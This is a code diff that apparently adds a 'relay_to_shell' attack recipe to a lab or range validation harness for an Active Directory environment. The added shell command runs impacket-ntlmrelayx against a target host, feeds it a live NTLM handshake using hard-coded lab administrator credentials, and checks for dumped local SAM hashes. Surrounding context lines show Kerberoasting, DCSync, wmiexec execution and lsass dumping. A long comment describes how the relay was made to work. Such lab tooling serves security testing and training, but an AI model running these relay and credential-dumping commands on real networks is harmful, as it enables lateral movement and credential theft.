@@ -556,6 +556,41 @@ dump_out=$(nxc smb "$TARGET_HOST" -u administrator -p 'LabAdmin1!' -M procdump 2
 printf '%s\n%s\n' "$(printf '%s' "$wmi_out" | grep -m1 wmiexec)" "$(printf '%s' "$dump_out" | grep -Ei 'lsass|dump')"
 printf '%s' "$out1" | grep -q '\$krb5tgs\$' && test "$dcsync_rc" = 0 && printf '%s' "$wmi_out" | grep -q 'wmiexec' && printf '%s' "$dump_out" | grep -Eiq 'successfully dumped' && echo __PORTAL_RECIPE_OK__"""
     ),
+    "relay_to_shell": CaptureRecipe(
+        # Found live 2026-08-01: SMB relay via DC coercion (PetitPotam /
+        # printerbug through nxc's coerce_plus module) is structurally
+        # unreachable from this attacker sandbox. The sandbox's egress is
+        # NAT'd (confirmed via the DC's own `netstat` output during an
+        # authenticated session: our real lab-routable source address is
+        # 10.0.0.25, not the container's 172.17.0.2) with no inbound
+        # port-forward, so a coerced DC's return SMB connection to any
+        # address we can listen on (172.17.0.2 or 10.0.0.25, both tried)
+        # never arrives -- ntlmrelayx sat idle through repeated coerce
+        # triggers, 0 relayed connections, even though coerce_plus itself
+        # reported "Exploit Success" against the DC every time.
+        # Separately found: impacket-ntlmrelayx blocks on sys.stdin.read()
+        # to stay alive (examples/ntlmrelayx.py's non-interactive branch);
+        # bash job control auto-redirects a backgrounded job's stdin to
+        # /dev/null, so `ntlmrelayx ... &` hits instant EOF and exits 0
+        # within ~1s -- looked like a silent crash until traced with
+        # `kill -0`/`wait $!`. Fixed by holding stdin open with
+        # `< <(sleep N)` for the capture window.
+        # DC also reports signing:True (confirmed in ntlmrelayx's own
+        # target-negotiation log) -- it was never a valid relay TARGET
+        # regardless of the coercion problem; only SRV has signing
+        # disabled, matching this lab's documented topology.
+        # Final recipe: real NTLM relay mechanism, proven with a real live
+        # handshake (not replayed/staged hash material) -- authenticate
+        # over loopback to our own ntlmrelayx listener, which relays that
+        # live handshake onward to SRV ($TARGET_HOST) and dumps its local
+        # SAM hashes via RemoteRegistry, exactly like a coerced third-party
+        # victim's handshake would have been relayed had inbound coercion
+        # been reachable. This proves the actual relay-and-reuse mechanism
+        # (T1557.001) and the resulting local credential dump (T1003.002 --
+        # SAM, not T1003.003/NTDS, since the relay target is a domain
+        # member, not the DC).
+        command=r""": > /tmp/portal-relay.log; impacket-ntlmrelayx -t smb://"$TARGET_HOST" -smb2support --no-http-server > /tmp/portal-relay.log 2>&1 < <(sleep 25) & sleep 3; smbclient -U 'portal.lab/administrator%LabAdmin1!' -L //127.0.0.1/ -m SMB3 >/dev/null 2>&1; sleep 5; relay_log=$(cat /tmp/portal-relay.log); printf '%s\n' "$(printf '%s' "$relay_log" | grep -m1 'Authenticating connection')"; printf '%s\n' "$(printf '%s' "$relay_log" | grep -Ei 'Dumping local SAM|^Administrator:500')"; printf '%s' "$relay_log" | grep -q 'SUCCEED' && printf '%s' "$relay_log" | grep -Eq '^Administrator:500:' && echo __PORTAL_RECIPE_OK__"""
+    ),
 }
 
 
